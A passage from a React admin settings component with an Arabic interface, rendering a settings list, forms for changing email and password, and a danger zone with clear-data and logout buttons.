          onClick={() => { playChime("click"); navigate(-1 as any); }}
          className="w-9 h-9 rounded-xl bg-white border border-slate-200/80 flex items-center justify-center hover:bg-slate-50 transition-all shadow-sm"
        >
          <ArrowRight className="w-4 h-4 text-slate-500" />
        </button>
        <div className="flex items-center gap-2.5">
          <h1 className="text-[16px] font-bold text-slate-800">الإعدادات</h1>
          <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-slate-700 to-slate-900 flex items-center justify-center shadow-lg">
            <Settings className="w-4.5 h-4.5 text-white" />
          </div>
        </div>
      </div>

      {/* Settings List */}
      <div className="bg-white rounded-2xl border border-slate-100/80 divide-y divide-slate-50/80 overflow-hidden shadow-sm">
        {settingsItems.map((item) => (
          <button
            key={item.label}
            onClick={(e) => { createRipple(e); item.onClick(); }}
            className="w-full flex items-center gap-3 px-4 py-3.5 hover:bg-slate-50/50 transition-all text-right btn-press relative overflow-hidden group"
          >
            <div className={`w-9 h-9 rounded-xl bg-gradient-to-br ${item.gradient} flex items-center justify-center shadow-md ${item.shadow} shrink-0 group-hover:scale-105 transition-transform`}>
              <item.icon className="w-4 h-4 text-white" />
            </div>
            <span className="text-[13px] font-semibold text-slate-700 flex-1">{item.label}</span>
            {"badge" in item && item.badge && (
              <span className={`text-[9px] font-bold rounded-full px-2.5 py-0.5 bg-gradient-to-r ${item.badgeGradient} text-white shadow-sm`}>
                {item.badge}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* Change Email Form */}
      <div
        className="overflow-hidden transition-all duration-300 ease-out"
        style={{ display: "grid", gridTemplateRows: changingEmail ? "1fr" : "0fr", opacity: changingEmail ? 1 : 0 }}
      >
        <div className="min-h-0">
          <div className="bg-white rounded-2xl border border-violet-200/80 p-4 space-y-3 shadow-sm">
            <div className="flex items-center gap-2 mb-1">
              <div className="w-6 h-6 rounded-lg bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center">
                <Mail className="w-3 h-3 text-white" />
              </div>
              <span className="text-[12px] font-bold text-violet-600">تغيير البريد الإلكتروني</span>
            </div>
            <input
              type="email"
              placeholder="البريد الإلكتروني الجديد"
              value={newEmail}
              onChange={(e) => setNewEmail(e.target.value)}
              className="w-full border border-slate-200/80 rounded-xl px-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all"
              dir="ltr"
            />
            <p className="text-[10px] text-slate-400">سيتم إرسال رابط تأكيد إلى البريد الجديد</p>
            <button
              onClick={(e) => { createRipple(e); handleChangeEmail(); }}
              className="w-full py-2.5 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white text-[13px] font-bold shadow-md shadow-violet-500/20 hover:shadow-lg transition-all btn-press relative overflow-hidden active:scale-[0.98]"
            >
              تغيير البريد الإلكتروني
            </button>
          </div>
        </div>
      </div>

      {/* Change Password Form */}
      <div
        className="overflow-hidden transition-all duration-300 ease-out"
        style={{ display: "grid", gridTemplateRows: changingPassword ? "1fr" : "0fr", opacity: changingPassword ? 1 : 0 }}
      >
        <div className="min-h-0">
          <div className="bg-white rounded-2xl border border-blue-200/80 p-4 space-y-3 shadow-sm">
            <div className="flex items-center gap-2 mb-1">
              <div className="w-6 h-6 rounded-lg bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center">
                <KeyRound className="w-3 h-3 text-white" />
              </div>
              <span className="text-[12px] font-bold text-blue-600">تغيير كلمة المرور</span>
            </div>
            <input
              type="password"
              placeholder="كلمة المرور الجديدة"
              value={newPassword}
              onChange={(e) => setNewPassword(e.target.value)}
              className="w-full border border-slate-200/80 rounded-xl px-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-400 transition-all"
            />
            <input
              type="password"
              placeholder="تأكيد كلمة المرور"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="w-full border border-slate-200/80 rounded-xl px-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-400 transition-all"
            />
            <button
              onClick={(e) => { createRipple(e); handleChangePassword(); }}
              className="w-full py-2.5 rounded-xl bg-gradient-to-r from-blue-500 to-indigo-600 text-white text-[13px] font-bold shadow-md shadow-blue-500/20 hover:shadow-lg transition-all btn-press relative overflow-hidden active:scale-[0.98]"
            >
              حفظ كلمة المرور
            </button>
          </div>
        </div>
      </div>

      {/* Danger Zone */}
      <div className="space-y-2">
        <div className="flex items-center gap-2 px-1">
          <AlertTriangle className="w-3.5 h-3.5 text-red-400" />
          <span className="text-[11px] font-bold text-red-400">منطقة الخطر</span>
        </div>
        <div className="bg-white rounded-2xl border border-red-100/80 divide-y divide-red-50/50 overflow-hidden shadow-sm">
          <button
            onClick={(e) => { createRipple(e); handleClearAll(); }}
            disabled={clearing}
            className="w-full flex items-center gap-3 px-4 py-3.5 hover:bg-red-50/50 transition-all text-right btn-press relative overflow-hidden group"
          >
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-red-500 to-rose-600 flex items-center justify-center shadow-md shadow-red-500/20 shrink-0 group-hover:scale-105 transition-transform">
              <Trash2 className="w-4 h-4 text-white" />
            </div>
            <span className="text-[13px] font-semibold text-red-500 flex-1">
              {clearing ? "جاري المسح..." : "مسح جميع البيانات"}
            </span>
          </button>

          <button
            onClick={(e) => { createRipple(e); handleLogout(); }}
            className="w-full flex items-center gap-3 px-4 py-3.5 hover:bg-red-50/50 transition-all text-right btn-press relative overflow-hidden group"
          >
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-slate-600 to-slate-800 flex items-center justify-center shadow-md shadow-slate-500/20 shrink-0 group-hover:scale-105 transition-transform">
              <LogOut className="w-4 h-4 text-white" />
            </div>
            <span className="text-[13px] font-semibold text-slate-600 flex-1">تسجيل الخروج</span>
          </button>
        </div>
      </div>
    </div>
  );
};

export default AdminSettings;
